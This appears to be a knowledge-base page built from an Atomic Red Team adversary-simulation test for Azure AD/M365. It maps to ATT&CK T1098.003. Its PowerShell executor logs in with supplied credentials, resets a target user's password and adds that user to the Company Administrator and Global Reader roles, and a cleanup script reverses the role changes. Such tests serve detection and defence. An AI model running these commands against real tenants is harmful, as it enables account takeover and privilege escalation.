---
atomic_guid: "14f3af20-61f1-45b8-ad31-4637815f3f44"
title: "Simulate - Post BEC persistence via user password reset followed by user added to company administrator role"
framework: "atomic"
generated: "true"
attack_technique_id: "T1098.003"
attack_technique_name: "Account Manipulation: Additional Cloud Roles"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.003/T1098.003.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "14f3af20-61f1-45b8-ad31-4637815f3f44"
  - "Simulate - Post BEC persistence via user password reset followed by user added to company administrator role"
platforms:
  - "azure-ad"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.
 Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges

## ATT&CK Mapping

- [[kb/attack/techniques/T1098-account_manipulation#^t1098003-additional-cloud-roles|T1098.003: Additional Cloud Roles]]

## Input Arguments

### auth_password

- description: Azure AD password for user auth_username
- type: string
- default: p4sswd

### auth_username

- description: Azure AD username used to conduct the adversary activity
- type: string
- default: jonh@contoso.com

### target_password

- description: The password that the user target_user will be reset to.
- type: string
- default: Ohn05GeMe#$

### target_user

- description: Name of the user whose password be reset and added to the admin role.
- type: string
- default: default

## Dependencies

MSOnline and AzureAD modules must be installed.

### Prerequisite Check

```powershell
$required_mods = 'AzureAD', 'MSOnline'
$installed_mods = @((Get-Module $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object -Unique)
$notInstalled = Compare-Object $required_mods $installed_mods -PassThru -ErrorAction SilentlyContinue

if ($notInstalled) {
# Prompt for installing the missing ones.
Write-Output "The following PS modules aren't currently installed:"
$notInstalled
  exit 1
}

 else{
  Write-Output "All required PS modules are installed"
  exit 0
 }
```

### Get Prerequisite

```powershell
Install-Module -Name MSOnline -Scope CurrentUser -Force
Install-Module -Name AzureAD -Scope CurrentUser -Force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
Import-Module MSOnline
Import-Module AzureAD
$password = ConvertTo-SecureString -String "#{auth_password}" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{auth_username}", $password
$targetsecurepw = ConvertTo-SecureString -String "#{target_password}" -AsPlainText -Force
Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue
Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue

#Saving the ObjectId of the target_user into a variable
$target_objid = Get-AzureADUser -filter "userPrincipalName eq '#{target_user}'" | Select-Object -ExpandProperty ObjectId

#Reset the password of the target_user
Set-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue

#Adding target_user
Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberEmailAddress "#{target_user}"
Add-MsolRoleMember -RoleName "Global Reader" -RoleMemberEmailAddress "#{target_user}"
```

### Cleanup

```powershell
Import-Module MSOnline
$password = ConvertTo-SecureString -String "#{auth_password}" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{auth_username}", $password
Connect-MsolService -Credential $credential
Remove-MsolRoleMember -RoleName "Company Administrator" -RoleMemberType User -RoleMemberEmailAddress "#{target_user}"
Remove-MsolRoleMember -RoleName "Global Reader" -RoleMemberType User -RoleMemberEmailAddress "#{target_user}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.003/T1098.003.yaml)
